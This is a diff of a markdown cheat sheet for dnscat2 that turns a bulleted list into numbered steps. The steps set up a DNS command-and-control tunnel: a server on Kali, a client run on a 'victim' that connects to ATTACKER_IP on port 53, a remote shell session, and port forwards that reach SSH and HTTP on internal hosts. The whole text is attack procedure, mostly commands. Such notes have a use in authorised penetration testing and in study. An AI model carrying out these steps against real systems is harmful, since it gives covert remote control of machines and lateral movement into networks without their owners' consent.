@@ -1,4 +1,4 @@
-# dnscat2 
+# Dnscat2 
 
 ### DNScat2 is a tool which can be used to create a tunnel with the help of DNS protocol. A connection to port 53 should be established to access any data. DNScat2 mainly consists of a client and a Kali Linux.
 
@@ -6,22 +6,32 @@
 
 ### Steps:
 
- - dnscat2-server (Kali Linux)
+#### 1) Run dnscat2 server on Kali
 
- - ./dnscat --dns=server=ATTACKER_IP,port=53
+    dnscat2-server (Kali Linux)
 
- - session (Kali)
+#### 2) Run dnscat on victim to connect to our Kali server via DNS
 
- - session -i 1 (Kali)
+    ./dnscat --dns=server=ATTACKER_IP,port=53
 
- - shell
+#### 3) Select the newly created session on our Kali server
 
- - session -i 2
+    session 
 
- - ifconfig (shell)
+    session -i 1 
 
- - listen 127.0.0.1:8888 TARGET:22 (shell)
+#### 4) We can create another session with this command
 
- - ssh USER@127.0.0.1 -p 8888 (Kali)
+    shell
+
+    session -i 2
+
+#### 5) On our 2nd shell session, we can run different commands. For example, we can create an SSH tunnel this way.
+
+    ifconfig 
+
+    listen 127.0.0.1:8888 TARGET:22 (shell)
+
+    ssh USER@127.0.0.1 -p 8888 (Kali)
 
  - listen 127.0.0.1:9999 192.168.226.129:80 (Port 80 tunneling)
